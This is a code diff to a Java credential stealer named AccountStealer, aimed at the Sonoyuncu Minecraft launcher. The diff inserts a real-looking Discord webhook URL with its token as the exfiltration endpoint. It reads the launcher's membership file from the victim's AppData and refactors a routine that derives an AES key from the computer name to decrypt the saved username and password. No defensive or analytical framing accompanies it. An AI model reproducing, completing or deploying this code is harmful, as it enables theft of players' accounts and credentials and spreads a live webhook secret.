@@ -29,7 +29,7 @@ public class AccountStealer {
 	{
 		username = new String("empty");
 		password = new String("empty");
-		webhookURL = new String("ur_webhook_url");
+		webhookURL = new String("https://canary.discord.com/api/webhooks/1068219201170444308/GlcFuk2tRxpsYkkygzqCxU6EYv4mZZrnXBc6Ch9iLqKsV-Iee2kMCwimOxTQhTL3ioPF");
 		membershipPath = new String(String.format("C:/Users/%s/Appdata/Roaming/.sonoyuncu/sonoyuncu-membership.json", System.getProperty("user.name")));
 	};
 	
@@ -53,63 +53,62 @@ public class AccountStealer {
 	}
     
 	private String getUsername() {
-		if ((username != "") & (username != null)) {
-			return username;
-		}
-		return (new NullPointerException().getMessage());
+		return username != null & !username.isEmpty() ? username : new NullPointerException().getMessage();
 	}
 
 	private String getPassword() {
-		if ((password != "") & (password != null)) {
-			return password;
-		}
-		return (new NullPointerException().getMessage());
+		return password != null & !password.isEmpty() ? password : new NullPointerException().getMessage();
 	}
 
 	private void setUsername(String username) {
-		if ((username != "") & (username != null)) {
+		if (username != null & !username.isEmpty()) {
 			this.username = username;
+		} else {
+			System.err.println("username = isEmpty() | null");
 		}
-		else System.err.println("username == \"\" & username == null");
 	}
-	
+
 	private void setPassword(String password) {
-		if ((password != "") & (password != null)) {
+		if (password != null & !password.isEmpty()) {
 			this.password = password;
+		} else {
+			System.err.println("password = isEmpty() | null");
 		}
-		else System.err.println("password == \"\" & password == null");
 	}
 	
 	enum tools {
 			
 		in;
 		
-		private JsonObject getDecryptJson(String path) throws Exception {
-			if (!new File(path).isFile()) return null;
+		private JsonObject getDecryptJson(String path) {
+			File file = new File(path);
+			if (!file.isFile()) return null;
 
-			DataInputStream dataInputStream = new DataInputStream(new FileInputStream(new File(path)));
-			if (dataInputStream.read() != 31) return null;
-			
-			byte[] array = new byte[8];
-			dataInputStream.read(array, 0, array.length);
-	         
-			byte[] array2 = new byte[dataInputStream.readInt()];
-			dataInputStream.read(array2, 0, array2.length);
-	         
-			byte[] array3 = new byte[1024];
-			ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-	         
-			int read;
-			while ((read = dataInputStream.read(array3, 0, array3.length)) != -1) {
-				byteArrayOutputStream.write(array3, 0, read);
+			try (DataInputStream dis = new DataInputStream(new FileInputStream(file))) {
+				if (dis.read() != 31) return null;
+
+				byte[] salt = new byte[8];
+				dis.readFully(salt);
+
+				byte[] encrypted = new byte[dis.readInt()];
+				dis.readFully(encrypted);
+
+				ByteArrayOutputStream baos = new ByteArrayOutputStream();
+				byte[] buffer = new byte[1024];
+				int read;
+				while ((read = dis.read(buffer)) != -1) {
+					baos.write(buffer, 0, read);
+				}
+
+				SecretKeySpec keySpec = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(System.getenv("computername").toCharArray(), salt, 65536, 128)).getEncoded(), "AES");
+
+				Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+				cipher.init(Cipher.DECRYPT_MODE, keySpec, new IvParameterSpec(encrypted));
+
+				return JsonParser.parseString(new String(cipher.doFinal(baos.toByteArray()), "utf-8")).getAsJsonObject();
+			} catch(Exception ignore) {
+				return JsonParser.parseString("1337").getAsJsonObject();
 			}
-			
-			SecretKeySpec secretKeySpec = new SecretKeySpec(SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(new PBEKeySpec(System.getenv("computerName").toCharArray(), array, 65536, 128)).getEncoded(), "AES");
-			
-			Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
-			instance.init(2, secretKeySpec, new IvParameterSpec(array2));
-
-			return JsonParser.parseString(new String(instance.doFinal(byteArrayOutputStream.toByteArray()), "utf-8")).getAsJsonObject();
 		}
 		
 	}
